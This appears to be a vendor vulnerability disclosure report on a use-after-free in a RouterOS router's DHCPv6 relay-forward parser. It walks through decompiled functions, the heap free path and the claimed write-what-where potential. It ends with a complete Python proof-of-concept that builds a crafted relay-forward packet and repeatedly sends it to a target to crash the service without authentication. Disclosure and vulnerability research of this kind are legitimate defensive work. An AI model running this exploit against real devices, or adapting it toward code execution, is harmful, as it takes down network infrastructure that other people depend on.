## **Description**

Device: hAP ax S router  
Firmware version: routeros-7.24.2

The dhcp service is vulnerable to Use-After-Free vulnerability. An attacker can send a specially crafted dhcp6 packet (Relay-forward) that will result in Denial Of Service and possible RCE (which is not demonstrated in this report).

Notes: dhcp is compiled with PIE disabled, NX enabled, partial RELRO, ASLR off

Only requirements are that dhcp6 is enabled and accessible by firewall for input at specific 547 port(not the default). 

## **Bug**

`FUN_00049b68` is the function that parses the client RELAY-FORW request in a recursive fashion. The first argument of this function is context struct, that has the relay records vector pointers {begin,end}, at offsets of \+0x58 and \+ 0x5c.

When a relay record is appended, the relay headers are copied from the request buffer into the record. With each record layout structure:

```
   1 byte hop
   16 byte link
   16 byte peer
   3 byte padding
   4 byte opts.begin (pointer to the per-record options vector) 
   4 byte opts.end (pointer)
```

Each record is meant to be 44 bytes dynamically allocated on the heap.

`opts.begin` and `opts.end` start as null and are populated later as the relay's options are parsed.

Note: msg-type of 1 byte from the request is consumed but not stored as part of a record.

> FUN_00049b68

```c
undefined4 dhcp6_relay_parse(void *ctx, byte *buf, ushort *plen, uint expect_type, uint depth)
{
  ...
  rec_end = *(int *)((int)ctx + 0x5c);            // relays.end  (ctx+0x5c)
  *plen = uVar1 - 0x22;                            // consume 34-byte relay header
  FUN_00044d68((RecordVec *)((int)ctx + 0x58),     // append 1 record; begin at ctx+0x58
               (rec_end - ...->begin >> 2) * -0x45d1745d + 1);   // count = (end-begin)/0x2c + 1
  rec_end = *(int *)((int)ctx + 0x5c);            // reload after append → into new record
  *(byte *)(rec_end - 0x2c) = buf[1];             // +0x00  hop
  puVar4 = (undefined4 *)(rec_end - 0x2b);         // +0x01  link  (16 bytes)
  do { ... } while (pbVar6 != buf + 0x12);
  puVar4 = (undefined4 *)(rec_end - 0x1b);         // +0x11  peer  (16 bytes)
  do { ... } while (pbVar7 != buf + 0x22);
```

The allocation starts in `FUN_00044d68`

> FUN\_00044D68

```c
void FUN_00044d68(RecordVec *record,uint desired_records)

{
  void *__s;
  char *relay_end;
  uint to_add;
  int words;
  
  relay_end = record->end;
  words = (int)relay_end - (int)record->begin >> 2;
  if (desired_records < (uint)(words * -0x45d1745d)) {
    FUN_00053de4(record,record->begin + desired_records * 0x2c,relay_end);
    return;
  }
  to_add = desired_records + words * 0x45d1745d;
  if (to_add != 0) {
    __s = (void *)vector_base::insert_raw
                            ((char *)record,(uint)relay_end,to_add,
                             (_func_void_void_ptr_void_ptr *)0x2c);
    memset(__s,0,to_add * 0x2c);
    return;
  }
  return;
}
```

> libuc++.so insert\_raw()

```c
/* vector_base::insert_raw(char*, unsigned int, unsigned int, void (*)(void*, void*)) */

char * __thiscall
vector_base::insert_raw
          (vector_base *this,char *param_1,uint param_2,uint param_3,
          _func_void_void_ptr_void_ptr *param_4)

{
  int old_begin;
  char *__src;
  int insert_bytes;
  
  insert_bytes = param_3 * param_2;
  old_begin = *(int *)this;
  reserve_raw(this,(*(int *)(this + 4) - old_begin) + insert_bytes,param_3,param_4);
  __src = param_1 + (*(int *)this - old_begin);
  if (param_4 == (_func_void_void_ptr_void_ptr *)0x0) {
    memmove(__src + insert_bytes,__src,*(int *)(this + 4) - (int)__src);
  }
  else {
    for (old_begin = (*(int *)(this + 4) - (int)__src) - param_3; -1 < old_begin;
        old_begin = old_begin - param_3) {
      (*param_4)(__src + old_begin + insert_bytes,__src + old_begin);
    }
  }
  *(int *)(this + 4) = *(int *)(this + 4) + insert_bytes;
  return __src;
}
```

> libuc++.so reserve\_raw()

```c
/* vector_base::reserve_raw(unsigned int, unsigned int, void (*)(void*, void*)) */

void __thiscall
vector_base::reserve_raw
          (vector_base *this,uint new_size,uint elem_size,_func_void_void_ptr_void_ptr *reloc_cb)

{
  uint uVar1;
  int new_block;
  int old_begin;
  int old_end;
  
  uVar1 = (*sizeOfMemRelated)(this,*(undefined4 *)this);
  if (new_size <= uVar1) {
    return;
  }
  old_begin = *(int *)this;
  old_end = *(int *)(this + 4);
  if (reloc_cb == (_func_void_void_ptr_void_ptr *)0x0) {
    new_block = (*reallocRelated)(this);
    *(int *)this = new_block;
    if (new_block != 0) goto LAB_00018adc;
  }
  else {
    new_block = (*mallocRelated)(this,new_size + 7 & 0xfffffff8);
    if (new_block != 0) {
      for (uVar1 = 0; uVar1 < (uint)(old_end - old_begin); uVar1 = uVar1 + elem_size) {
        (*reloc_cb)((void *)(new_block + uVar1),(void *)(*(int *)this + uVar1));
      }
      (*freeRelated)(this);
      *(int *)this = new_block;
LAB_00018adc:
      *(int *)(this + 4) = *(int *)this + (old_end - old_begin);
      return;
    }
  }
  eAbortCause = "vector_base::reserve_raw out of memory";
  abort();
}
```

After appending record \#0 (first record), the parser caches rec\_end (= ctx-\>relays.end, a pointer into the records buffer, we will call it "block A") into registers `r7`, and `r11` \= rec\_end − 8 \= \&record.opts.begin.

While parsing the first record's options from request buffer, an OPTION\_RELAY\_MSG (code 9\) causes the parser to recurse into `dhcp6_relay_parse` on the nested relay message, passing the same ctx (depth \+ 1 \-\> recursion level). Because ctx is shared, the recursive call appends its own relay record — record \#1 — into the same relay vector.

The first append allocated a 48-byte buffer for "block A" (56 usable after allocator rounding), holding one 44-byte record. Record \#1 brings the vector to 88 bytes; since 88 \> 56, reserve\_raw takes its grow path — allocating a new buffer, relocating record \#0, and freeing block A. So the recursive OPTION\_RELAY\_MSG parse is what frees the very buffer the outer frame is still pointing at via rec\_end (r7/r11).

The subsequent store path dereferences rec\_end−8/rec\_end−4 to read and update opts.begin/opts.end — now located in the freed block A. This is where UAF occurs.

```
OUTER call (depth 0), parsing record #0:
  1. append record #0 → block A (48B / 56 usable)
  2. cache rec_end (r7) and r11 = rec_end-8 = &opts.begin   ← pointers INTO block A
  3. option loop over record #0's options:
        hits OPTION_RELAY_MSG  ──► RECURSE (depth 1)  ─────────────┐
                                                                   │
     INNER call (depth 1), parsing the nested message:            │
       a. APPEND record #1  → vector now needs 88 > 56            │
          → reserve_raw grows: malloc(new) + relocate + FREE(block A)   ← the free/realloc happens HERE
       b. …parses the nested message's own header/options…        │
       c. returns  ───────────────────────────────────────────────┘
  4. back in OUTER: rec_end (r7/r11) still points into the now-FREED block A
        (rec_end-8/-4 = opts.begin/opts.end, which lived inside block A)
  5. next option in record #0's loop → store path → derefs rec_end → USE-AFTER-FREE
```

```c
// dhcp6_relay_parse @ 0x49c5c-0x49d20  (rec_end was loaded at 0x49c10, NOT reloaded below)
while (*plen != 0) {
    ... parse option code + length from the packet ...

    if (*(short *)pbVar7 == 0x900) {          // OPTION_RELAY_MSG (code 9)
        // (2) FREE: recursion appends record #1; the vector exceeds capacity, so
        //     reserve_raw() (above) takes the grow path -> free(block A).
        dhcp6_relay_parse(ctx, pbVar7 + 4, local_2a, expect_type, depth + 1);
    }
    else {
        // (3) USE-AFTER-FREE: rec_end still points into the freed block A.
        //     reads opts.begin/end at rec_end-8 / rec_end-4 (freed heap):
        FUN_00044b60(rec_end - 8, (*(int*)(rec_end-4) - *(int*)(rec_end-8) >> 3) + 1);
        memcpy(*(void **)(*(int*)(rec_end - 4) - 8), pbVar7, __n);   // write through freed opts.end
    }
    pbVar7 += __n;
}
```

```
0x49c50  sub  fp, r7, #8        ; fp/r11 = rec_end - 8 = &opts.begin   (cached)
0x49cc8  bl   dhcp6_relay_parse ; recursive append frees block A
         ; r7 / fp are callee-saved and are NOT reloaded from ctx+0x5c after the bl
```

Because the "block A" is attacker's reclaimable, `opts.begin` and `opts.end` become attacker controlled, so `reserves_raw`\-\> `free(opts.begin)` results in arbitrary free() and `memcpy(*(void **)(*(int*)(rec_end - 4) - 8), pbVar7, __n);` in **"write-what-where".

## **PoC 

The only proven thing in this report so far is DoS, the crash depends on the reclaim landing and the reclaim only lands reliably when the heap is in a clean state. 

> poc\_dos.py

```python
#!/usr/bin/env python3
# =============================================================================
#    Run it like this for example:
#       ./poc_dos.py fd00:dead:beef::1
# =============================================================================
import argparse, socket, struct, sys, time

RELAY_FORW          = 0x0C
OPT_CLIENTID        = 0x01
OPT_RELAY_MSG       = 0x09
OPT_INTERFACE       = 0x12
OPT_ORO             = 0x06
OPT_ELAPSED         = 0x08
INFORMATION_REQUEST = 0x0B


def opt(code, data):
    return struct.pack("!HH", code, len(data)) + data


def relay_forw(hop, options, link=b"\x00" * 16, peer=b"\x00" * 16):
    return bytes([RELAY_FORW, hop]) + link + peer + options


def build_crash(marker=0x41414141, reclaim_len=44, trailers=8, trailer_len=44):
    """The UAF trigger.

    A nested OPTION_RELAY_MSG makes the parser cache a relay-record pointer,
    then the recursion reallocates+frees the record vector (use-after-free).
    The inner 44-byte INTERFACE-ID value reclaims that freed block, and the
    trailing options drive the stale pointer into use, faulting the daemon.
    """
    w = struct.pack("<I", marker & 0xFFFFFFFF)
    reclaim = (w * (reclaim_len // 4 + 1))[:reclaim_len]

    inner  = relay_forw(hop=1, options=opt(OPT_INTERFACE, reclaim))
    outer  = opt(OPT_CLIENTID, b"\xAA" * 4)
    outer += opt(OPT_RELAY_MSG, inner)
    for _ in range(trailers):
        outer += opt(OPT_INTERFACE, b"\xBB" * trailer_len)   # drive the stale use
    return relay_forw(hop=0, options=outer)


def make_socket():
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    return s


def dst_of(a):
    if a.iface and a.target.startswith("fe80"):
        return (a.target, a.dport, 0, socket.if_nametoindex(a.iface))
    return (a.target, a.dport)


def main():
    ap = argparse.ArgumentParser(
        description="RouterOS DHCPv6 relay UAF -> unauthenticated remote DoS")
    ap.add_argument("target", help="device IPv6 (fe80::.. needs --iface)")
    ap.add_argument("--iface", help="interface, for a link-local target")
    ap.add_argument("--dport", type=int, default=547)
    ap.add_argument("--shots", type=int, default=10,
                    help="crash packets to send in the run (the fault is probabilistic)")
    ap.add_argument("--delay", type=float, default=0.5, help="seconds between packets")
    ap.add_argument("--marker", type=lambda x: int(x, 0), default=0x41414141)
    a = ap.parse_args()

    s = make_socket()
    dst = dst_of(a)
    crash = build_crash(a.marker)

    print(f"[*] target [{a.target}]:{a.dport}   crash packet = {len(crash)} bytes ")

    for i in range(a.shots):
        s.sendto(crash, dst)
        print(f"[*] sent crash packet {i + 1}/{a.shots}")
        time.sleep(a.delay)

    print(f"\n[*] Run complete -- {a.shots} crash packets sent to [{a.target}]:{a.dport}.")
    print("[*] The fault is probabilistic; it may not have landed on every packet.")
    print("[*] >>> Confirm the DoS out-of-band: check the device log for a service")
    print("[*]     malfunction / autosupout.rif")


if __name__ == "__main__":
    main()

```

## **90 days policy**

IMPORTANT: This vulnerability is reported under the 90+30 disclosure policy (version 2025), i.e. this report will be shared publicly with the defensive community on 21st December 2026 if a patch/fix is not available by that time, or 30 days after the fix becomes available. For details please see:  
 [https://projectzero.google/vulnerability-disclosure-policy.html](https://projectzero.google/vulnerability-disclosure-policy.html)
